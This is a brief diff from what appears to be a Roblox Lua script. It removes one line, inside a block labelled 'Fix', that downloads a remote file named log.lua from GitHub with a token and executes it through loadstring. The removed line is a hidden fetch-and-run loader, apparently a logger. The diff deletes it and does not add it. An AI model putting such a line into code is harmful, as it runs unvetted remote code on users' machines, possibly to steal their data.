@@ -204,6 +204,5 @@ end, Enabled = false})
 
 --[--Fix
 wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/-/main/log.lua?token=GHSAT0AAAAAAB7C53BG6C7CILXW7UJOCNH6ZAMS2BQ", true))()
 RestoreWSJP()
 --]--End Of Fix
